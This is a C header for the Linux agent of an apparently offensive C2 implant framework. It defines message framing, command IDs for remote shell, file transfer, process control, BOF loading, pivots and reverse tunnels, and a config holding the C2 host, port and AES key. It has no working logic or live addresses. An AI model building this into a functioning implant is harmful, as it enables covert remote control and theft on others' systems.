// nax_linux.h — NAX Linux agent: shared types, wire constants, config
#pragma once

#include <stdint.h>
#include <time.h>
#include <stddef.h>
#include <stdbool.h>

/* ===== wire constants ===== */
#define NAX_WIRE_REGISTER   0x01u
#define NAX_WIRE_HEARTBEAT  0x02u
#define NAX_WIRE_RESULT     0x03u
#define NAX_WIRE_NO_TASKS   0x80u
#define NAX_WIRE_TASK       0x81u
#define NAX_WIRE_PROFILE    0x82u

/* ===== arch IDs (match NAX_ARCH_* in Instance.h) ===== */
#define NAX_ARCH_X86    0x01u
#define NAX_ARCH_X64    0x02u
#define NAX_ARCH_ARM    0x03u
#define NAX_ARCH_ARM64  0x04u

#if defined(__aarch64__)
#  define NAX_ARCH_CURRENT NAX_ARCH_ARM64
#elif defined(__arm__)
#  define NAX_ARCH_CURRENT NAX_ARCH_ARM
#elif defined(__x86_64__) || defined(_M_X64)
#  define NAX_ARCH_CURRENT NAX_ARCH_X64
#else
#  define NAX_ARCH_CURRENT NAX_ARCH_X86
#endif

/* ===== frame header ===== */
/* [msg_type(1)][reserved(1)][body_len(4)] */
#define NAX_FRAME_HDR   6u

/* ===== result status ===== */
#define NAX_STATUS_OK      0x00u
#define NAX_STATUS_ERR     0x01u
#define NAX_STATUS_TUNNEL  0x20u
#define NAX_STATUS_ASYNC   0xFEu

/* ===== command IDs (subset implemented in Linux agent) ===== */
#define NAX_CMD_WHOAMI       0x10u
#define NAX_CMD_EXIT_THREAD  0x12u
#define NAX_CMD_EXIT_PROCESS 0x13u
#define NAX_CMD_CD           0x14u
#define NAX_CMD_PWD          0x15u
#define NAX_CMD_MKDIR        0x16u
#define NAX_CMD_RMDIR        0x17u
#define NAX_CMD_CAT          0x18u
#define NAX_CMD_LS           0x19u
#define NAX_CMD_RM           0x27u
#define NAX_CMD_PS_LIST      0x23u
#define NAX_CMD_IFCONFIG     0x2Bu
#define NAX_CMD_PS_KILL      0x24u
#define NAX_CMD_PS_RUN       0x25u
#define NAX_CMD_DOWNLOAD     0x22u
#define NAX_CMD_UPLOAD       0x26u
#define NAX_CMD_SHELL        0x28u
#define NAX_CMD_ENV          0x29u
#define NAX_CMD_ZIP          0x2Au
#define NAX_CMD_SLEEP        0x2Cu
#define NAX_CMD_BOF          0x50u
#define NAX_CMD_BOF_ASYNC    0x51u
#define NAX_CMD_BOF_JOBS     0x52u
#define NAX_CMD_BOF_KILL     0x53u
#define NAX_CMD_LINK         0x38u

/* Tunnel wire command IDs — must match pl_tunnels.go cmdTunnel* constants */
#define NAX_CMD_TUNNEL_CONNECT_TCP  0x3Eu
#define NAX_CMD_TUNNEL_WRITE_TCP    0x40u
#define NAX_CMD_TUNNEL_CLOSE        0x42u
#define NAX_CMD_TUNNEL_REVERSE      0x43u
#define NAX_CMD_TUNNEL_ACCEPT       0x44u
#define NAX_CMD_TUNNEL_PAUSE        0x45u
#define NAX_CMD_TUNNEL_RESUME       0x46u

#define NAX_CMD_PROFILE_UPDATE 0x3Au

/* Tunnel connection entry in the agent's list */
typedef struct NaxTunnel {
    int        sock;           /* TCP socket (-1 = not connected) */
    uint32_t   channel_id;     /* server-assigned channel ID */
    uint32_t   type;           /* tunnel type from C2 */
    uint8_t    state;          /* TUN_STATE_* */
    uint8_t    mode;           /* TUN_MODE_* */
    uint32_t   wait_time;      /* connect timeout in ms */
    uint64_t   start_tick;     /* for timeouts */
    uint32_t   close_timer;    /* close phase timer */
    uint8_t   *write_buf;      /* pending outbound data */
    uint32_t   write_buf_size; /* size of pending data */
    int        paused;         /* local flow control */
    int        srv_paused;     /* server asked us to pause */
    struct NaxTunnel *next;
} NaxTunnel;

/* Pivot result payload types (packed into RESULT frame by ProcessPivots) */
#define NAX_PIV_TYPE_DATA    0u   /* child data to relay to C2            */
#define NAX_PIV_TYPE_UNLINK  1u   /* child disconnected                   */
#define NAX_CMD_UNLINK       0x39u  /* disconnect a child pivot agent */

/* ===== crypto ===== */
#define NAX_AES_KEY_SIZE 16u
#define NAX_AES_IV      16u
#define NAX_AES_BLOCK   16u

/* ===== session ID length (hex string, no NUL) ===== */
#define NAX_SID_LEN     16u

/* ===== I/O buffer sizes ===== */
#define NAX_IO_CAP      (8 * 1024 * 1024)  /* 8 MB */

/* ===== TCP chunk ===== */
#define NAX_TCP_CHUNK   (256 * 1024)

/* ===== agent watermark (CRC identifying this extender) ===== */
#define NAX_LINUX_WM    0xDEADBEEFu  /* set to match extender server-side */

/* ===== config — filled by BuildPayload / hardcoded for now ===== */
typedef struct {
    char     c2_host[256];   /* connect-out mode: C2 host */
    uint16_t c2_port;        /* connect-out mode: C2 port */
    uint16_t bind_port;      /* bind mode: local port to listen on */
    uint8_t  aes_key[NAX_AES_KEY_SIZE];
    uint32_t sleep_ms;
    uint32_t jitter_pct;
    time_t   profile_burst_until; /* skip sleep until this time (profile update burst) */
    uint32_t wm;             /* listener watermark */
} NaxConfig;

/* ===== decoded task ===== */
typedef struct {
    uint32_t  task_id;
    uint8_t   cmd_id;
    uint32_t  args_len;
    uint8_t  *args;
} NaxTask;

/* ===== child pivot entry (linked list) ===== */
typedef struct NaxPivot {
    int              sock;      /* TCP socket to child */
    uint32_t         pivot_id;  /* server-assigned pivot_id (= task_id of CMD_LINK) */
    struct NaxPivot *next;
} NaxPivot;

/* ===== agent instance ===== */
typedef struct {
    NaxConfig cfg;
    int       sock;            /* connected TCP socket to C2 or parent */
    NaxPivot  *pivot_head;     /* linked list of child pivot connections */
    NaxTunnel *tunnel_head;    /* linked list of active tunnel channels */
    char      session_id[NAX_SID_LEN + 1];  /* hex, NUL-terminated */
    bool      running;
    volatile int profile_pending;   /* set by profile_update: skip sleep for 1 cycle */
    uint8_t  *pending_profile_data; /* deferred profile bytes, applied after result POST */
    uint32_t  pending_profile_len;
} NaxAgent;

/* ===== Debug macro ===== */
#ifdef NAX_DEBUG
#  include <stdio.h>
#  include <time.h>
static inline const char *_nax_dbg_ts(void) {
    static char _ts[32];
    struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
    struct tm *tm = localtime(&ts.tv_sec);
    snprintf(_ts, sizeof(_ts), "%02d:%02d:%02d.%03ld",
             tm->tm_hour, tm->tm_min, tm->tm_sec, ts.tv_nsec / 1000000L);
    return _ts;
}
#  define DBG(fmt, ...)  fprintf(stderr, "[NAX-DBG %s] " fmt "\n", _nax_dbg_ts(), ##__VA_ARGS__)
#  define DBG_SEC(label) fprintf(stderr, "[NAX-DBG %s] ======== %s ========\n", _nax_dbg_ts(), label)
#  define DBG_ERR(fmt, ...) fprintf(stderr, "[NAX-ERR %s] " fmt "\n", _nax_dbg_ts(), ##__VA_ARGS__)
#  define DBG_OK(fmt, ...)  fprintf(stderr, "[NAX-OK  %s] " fmt "\n", _nax_dbg_ts(), ##__VA_ARGS__)
#else
#  define DBG(fmt, ...)     do {} while(0)
#  define DBG_SEC(label)    do {} while(0)
#  define DBG_ERR(fmt, ...) do {} while(0)
#  define DBG_OK(fmt, ...)  do {} while(0)
#endif
